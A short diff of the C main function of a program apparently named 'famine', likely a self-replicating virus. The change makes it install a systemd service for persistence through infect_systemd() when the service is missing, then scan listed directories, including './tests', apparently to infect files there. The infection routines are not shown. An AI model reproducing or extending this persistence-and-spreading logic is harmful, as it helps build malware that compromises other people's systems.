@@ -9,17 +9,13 @@ int main(void) {
                            "./tests", NULL};
 
     // check for the daemon
-    if (service_is_enabled("famine.service")) {
-        // execute famine
-        for (size_t i = 0; paths[i]; i++)
-            scan_directory(paths[i]);
-        return (0);
+    if (!service_is_enabled("famine.service")) {
+        infect_systemd();
     }
 
-    // install daemon
-    infect_systemd();
+    // execute famine
+    for (size_t i = 0; paths[i]; i++)
+        scan_directory(paths[i]);
 
-    // delete famine (execve returns on failure)
-
-    return (1);
+    return (0);
 }
